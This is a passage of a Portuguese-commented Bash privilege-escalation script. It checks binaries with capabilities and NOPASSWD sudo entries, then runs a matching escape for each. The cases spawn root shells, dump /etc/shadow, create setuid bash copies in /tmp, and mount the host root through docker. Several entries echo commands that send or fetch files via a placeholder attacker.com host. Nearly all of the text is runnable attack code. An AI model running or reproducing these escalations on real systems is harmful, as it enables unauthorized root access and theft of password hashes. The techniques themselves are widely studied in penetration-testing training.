            ;;
        php)
            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
            CMD="/bin/sh"
            "$pathc" -r "posix_setuid(0); system('$CMD');"
            ;;
        python|python3)
            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
            "$pathc" -c 'import os; os.setuid(0); os.system("/bin/sh")'
            ;;
        ruby)
            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
            "$pathc" -e 'Process::Sys.setuid(0); exec "/bin/sh"'
            ;;
        rview|rvim)
            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
            "$pathc" -c ':lua os.execute("reset; exec sh")'
            ;;
        view|vim|vimdiff)
            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
            "$pathc" -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
            ;;
        *)
            ;;
    esac
done

echo -e "\e[1;35m"
echo "[*] --------------- sudo -l ---------------"
echo "[*] [*] Verificando permissões sudo -l ...."
echo "[*] ---------------------------------------"
echo -e "\e[0m"


sudol=$(sudo -n -l 2>&1)
if [[ $? -ne 0 ]]; then
    echo "[-] 'sudo -n -l' falhou: $sudol"
    exit 1
fi

echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
    bina=$(basename "$paths")

    case "$bina" in
        7z)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" a -ttar -an -so /etc/shadow | "$paths" e -ttar -si -so
            ;;
        aa-exec)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        ab)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "URL=http://attacker.com/"
            echo "LFILE=file_to_send"
            echo "sudo ab -p $LFILE $URL"
            ;;
        alpine)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -F /etc/shadow
            ;;
        ansible-playbook)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
            sudo "$paths" $TF
            ;;
        ansible-test)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" shell
            ;;
        aoss)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        apache2ctl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c "Include /etc/shadow" -k stop
            ;;
        apt-get)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas possiveis):"
            sudo "$paths" update -o APT::Update::Pre-Invoke::=/bin/sh
            ;;
        apt)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas possiveis):"
            sudo "$paths" update -o APT::Update::Pre-Invoke::=/bin/sh
            ;;
        ar)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -u)
            LFILE=/etc/shadow
            sudo "$paths" r "$TF" "$LFILE"
            cat "$TF"
            ;;
        aria2c)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -p
            cmd='id'
            TF=$(mktemp)
            echo "$cmd" > $TF
            chmod +x $TF
            sudo "$paths" --on-download-error=$TF http://x
            ;;
        arj)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "TF=$(mktemp -d)"
            echo "LFILE=file_to_write"
            echo "LDIR=where_to_write"
            echo "echo DATA >"$TF/$LFILE""
            echo "arj a "$TF/a" "$TF/$LFILE""
            echo "sudo arj e "$TF/a" $LDIR"
            ;;
        arp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -v -f /etc/shadow
            ;;
        as)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            sudo "$paths" @$LFILE
            ;;
        ascii-xfr)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -ns /etc/shadow
            ;;
        ascii85)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths" --decode
            ;;
        ash)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        aspell)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c /etc/shadow
            ;;
        at)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo "$paths" now; tail -f /dev/null
            ;;
        atobm)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow 2>&1 | awk -F "'" '{printf "%s", $2}'
            ;;
        awk)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" 'BEGIN {system("/bin/sh")}'
            ;;
        aws)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" help
            !/bin/sh
            ;;
        base32)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths" --decode
            ;;
        base58)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths" --decode
            ;;
        base64)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths" --decode
            ;;
        basenc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --base64 /etc/shadow | "$paths" -d --base64
            ;;
        basez)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths" --decode
            ;;
        bash)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        batcat)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --paging always /etc/profile
            !/bin/sh
            ;;
        bc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -s /etc/shadow
            quit
            ;;
        bconsole)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            @exec /bin/sh
            ;;
        bpftrace)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas possiveis):"
            sudo "$paths" -e 'BEGIN {system("/bin/sh");exit()}'
            ;;
        bridge)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -b /etc/shadow
            ;;
        bundle)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" help
            !/bin/sh
            ;;
        bundler)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" help
            !/bin/sh
            ;;
        busctl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
            ;;
        busybox)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" sh
            ;;
        byebug)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo 'system("/bin/sh")' > $TF
            sudo "$paths" $TF
            continue
            ;;
        bzip2)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c /etc/shadow | "$paths" -d
            ;;
        c89)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -wrapper /bin/sh,-s .
            ;;
        c99)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -wrapper /bin/sh,-s .
            ;;
        cabal)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" exec -- /bin/sh
            ;;
        capsh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --
            ;;
        cat)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        cdist)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" shell -s /bin/sh
            ;;
        certbot)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            sudo "$paths" certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'
            ;;
        check_by_ssh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx
            ;;
        check_cups)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            sudo "$paths" --extra-opts=@$LFILE
            ;;
        check_log)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "LFILE=file_to_write"
            echo "INPUT=input_file"
            echo "sudo check_log -F $INPUT -O $LFILE"
            ;;
        check_memory)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            sudo "$paths" --extra-opts=@$LFILE
            ;;
        check_raid)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            sudo "$paths" --extra-opts=@$LFILE
            ;;
        check_ssl_cert)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cmd=id
            out=output_file
            TF=$(mktemp)
            echo "$cmd | tee $out" > $TF
            chmod +x $TF
            umask 022
            "$paths" --curl-bin $TF -H example.net
            cat $out
            ;;
        check_statusfile)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        chmod)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "LFILE=file_to_change"
            echo "sudo chmod 6777 $LFILE"
            ;;
        choom)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -n 0 /bin/sh
            ;;
        chown)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "LFILE=file_to_change"
            echo "sudo chown $(id -un):$(id -gn) $LFILE"
            ;;
        chroot)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /
            ;;
        clamscan)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            TF=$(mktemp -d)
            touch $TF/empty.yara
            sudo "$paths" --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
            ;;
        cmp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow /dev/zero -b -l
            ;;
        cobc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
            sudo "$paths" -xFj --frelax-syntax-checks $TF/x
            ;;
        column)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        comm)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow /dev/null 2>/dev/null
            ;;
        composer)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
            sudo "$paths" --working-dir=$TF run-script x
            ;;
        cowsay)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo 'exec "/bin/sh";' >$TF
            sudo "$paths" -f $TF x
            ;;
        cowthink)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo 'exec "/bin/sh";' >$TF
            sudo "$paths" -f $TF x
            ;;
        cp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (Possui 3 tecnicas):"
            echo "LFILE=file_to_write"
            echo "echo "DATA" | sudo cp /dev/stdin "$LFILE""
            ;;
        cpan)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ! exec '/bin/bash'
            ;;
        cpio)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (Possui 3 tecnicas):"
            echo '/bin/sh </dev/tty >/dev/tty' >localhost
            sudo "$paths" -o --rsh-command /bin/sh -F localhost:
            ;;
        cpulimit)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -l 100 -f /bin/sh
            ;;
        crash)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -h
            !sh
            ;;
        crontab)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e
            ;;
        csh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        csplit)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow 1
            cat xx01
            ;;
        csvtool)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" call '/bin/sh;false' /etc/passwd
            ;;
        cupsfilter)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -i application/octet-stream -m application/octet-stream /etc/shadow
            ;;
        curl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "URL=http://attacker.com/file_to_get"
            echo "LFILE=file_to_save"
            echo "sudo curl $URL -o $LFILE"
            ;;
        cut)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -d "" -f1 /etc/shadow
            ;;
        dash)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        date)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow
            ;;
        dc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e '!/bin/sh'
            ;;
        dd)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "LFILE=file_to_write"
            echo "echo "data" | sudo dd of=$LFILE"
            ;;
        debugfs)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        dialog)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --textbox /etc/shadow 0 0
            ;;
        diff)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --line-format=%L /dev/null /etc/shadow
            ;;
        dig)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow
            ;;
        distcc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        dmesg)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -H
            !/bin/sh
            ;;
        dmidecode)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "make dmiwrite"
            echo "TF=$(mktemp)"
            echo "echo "DATA" > $TF"
            echo "./dmiwrite $TF x.dmi"
            echo "LFILE=file_to_write"
            echo "sudo dmidecode --no-sysfs -d x.dmi --dump-bin "$LFILE""
            ;;
        dmsetup)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" create base <<EOF
            0 3534848 linear /dev/loop0 94208
EOF
            sudo "$paths" ls --exec '/bin/sh -s'
            ;;
        dnf)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo 'id' > $TF/x.sh
            fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
            sudo "$paths" install -y x-1.0-1.noarch.rpm
            ;;
        docker)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" run -v /:/mnt --rm -it alpine chroot /mnt sh
            ;;
        dosbox)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "LFILE='\path\to\file_to_write'"
            echo "sudo dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit"
            ;;
        dotnet)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "sudo "$paths" fsi"
            echo "System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;"
            ;;
        dpkg)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (Temos 2 tecnicas):"
            sudo "$paths" -l
            !/bin/sh
            ;;
        dstat)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
            sudo "$paths" --xxx
            ;;
        dvips)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            tex '\special{psfile="`/bin/sh 1>&0"}\end'
            sudo "$paths" -R0 texput.dvi
            ;;
        easy_install)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
            sudo "$paths" $TF
            ;;
        eb)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" logs
            !/bin/sh
            ;;
        ed)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        efax)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -d /etc/shadow
            ;;
        elvish)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        emacs)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -Q -nw --eval '(term "/bin/sh")'
            ;;
        enscript)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /dev/null -qo /dev/null -I '/bin/sh >&2'
            ;;
        env)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        eqn)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        espeak)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -qXf /etc/shadow
            ;;
        ex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        exiftool)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "LFILE=file_to_write"
            echo "INPUT=input_file"
            echo "sudo exiftool -filename=$LFILE $INPUT"
            ;;
        expand)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        expect)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c 'spawn /bin/sh;interact'
            ;;
        facter)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo 'exec("/bin/sh")' > $TF/x.rb
            sudo FACTERLIB=$TF "$paths"
            ;;
        file)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow
            ;;
        find)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" . -exec /bin/sh \; -quit
            ;;
        fish)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        flock)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -u / /bin/sh
            ;;
        fmt)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -999 /etc/shadow
            ;;
        fold)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -w99999999 /etc/shadow
            ;;
        fping)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow
            ;;
        ftp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        gawk)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" 'BEGIN {system("/bin/sh")}'
            ;;
        gcc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -wrapper /bin/sh,-s .
            ;;
        gcloud)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" help
            !/bin/sh
            ;;
        gcore)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "Verifique os processos"
            echo "sudo gcore $PID"
            ;;
        gdb)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -nx -ex '!sh' -ex quit
            ;;
        gem)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" open -e "/bin/sh -c /bin/sh" rdoc
            ;;
        genie)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c '/bin/sh'
            ;;
        genisoimage)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -q -o - /etc/shadow
            ;;
        ghc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'System.Process.callCommand "/bin/sh"'
            ;;
        ghci)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "sudo ghci"
            echo "System.Process.callCommand "/bin/sh""
            ;;
        gimp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -idf --batch-interpreter=python-fu-eval -b 'import os; os.system("sh")'
            ;;
        ginsh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        git)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Temos diversas tecnicas. Testando:"
            sudo PAGER='sh -c "exec sh 0<&1"' "$paths" -p help
            ;;
        grc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --pty /bin/sh
            ;;
        grep)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" '' /etc/shadow
            ;;
        gtester)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo '#!/bin/sh' > $TF
            echo 'exec /bin/sh 0<&1' >> $TF
            chmod +x $TF
            sudo "$paths" -q $TF
            ;;
        gzip)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow -t
            ;;
        hd)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        head)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c1G /etc/shadow
            ;;
        hexdump)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -C /etc/shadow
            ;;
        highlight)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --no-doc --failsafe /etc/shadow
            ;;
        hping3)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            sudo "$paths"
            /bin/sh
            ;;
        iconv)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f 8859_1 -t 8859_1 /etc/shadow
            ;;
        iftop)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        install)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cp /bin/bash /tmp/bsuid
            sudo "$paths" -m 6777 /tmp/bsuid /tmp/rsh
            /tmp/rsh -p
            rm -f /tmp/bsuid
            ;;
        ionice)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        ip)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas):"
            sudo "$paths" -force -batch /etc/shadow
            ;;
        irb)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            exec '/bin/bash'
            ;;
        ispell)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/passwd
            !/bin/sh
            ;;
        jjs)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | sudo $paths
            ;;
        joe)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ^K!/bin/sh
            ;;
        join)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -a 2 /dev/null /etc/shadow
            ;;
        journalctl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        jq)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -Rr . /etc/shadow
            ;;
        jrunscript)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"
            ;;
        jtag)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --interactive
            shell /bin/sh
            ;;
        julia)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'run(`/bin/sh`)'
            ;;
        knife)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" exec -E 'exec "/bin/sh"'
            ;;
        ksh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        ksshell)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -i /etc/shadow
            ;;
        ksu)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -q -e /bin/sh
            ;;
        kubectl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "LFILE=dir_to_serve"
            echo "sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
            ;;
        latex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            sudo "$paths" --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
            ;;
        latexmk)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'exec "/bin/sh";'
            ;;
        ld.so)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /lib/ld.so /bin/sh
            ;;
        ldconfig)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "TF=$(mktemp -d)"
            echo "echo "$TF" > "$TF/conf""
            echo "# move malicious libraries in $TF"
            echo "sudo ldconfig -f "$TF/conf""
            ;;
        less)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/profile
            !/bin/sh
            ;;
        lftp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c '!/bin/sh'
            ;;
        links)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        ln)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -fs /bin/sh /bin/ln
            sudo "$paths"
            ;;
        loginctl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" user-status
            !/bin/sh
            ;;
        logsave)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /dev/null /bin/sh -i
            ;;
        look)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" '' /etc/shadow
            ;;
        ltrace)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -b -L /bin/sh
            ;;
        lua)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'os.execute("/bin/sh")'
            ;;
        lualatex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute("/bin/sh")}\end{document}'
            ;;
        luatex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -shell-escape '\directlua{os.execute("/bin/sh")}\end'
            ;;
        lwp-download)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "URL=http://attacker.com/file_to_get"
            echo "LFILE=file_to_save"
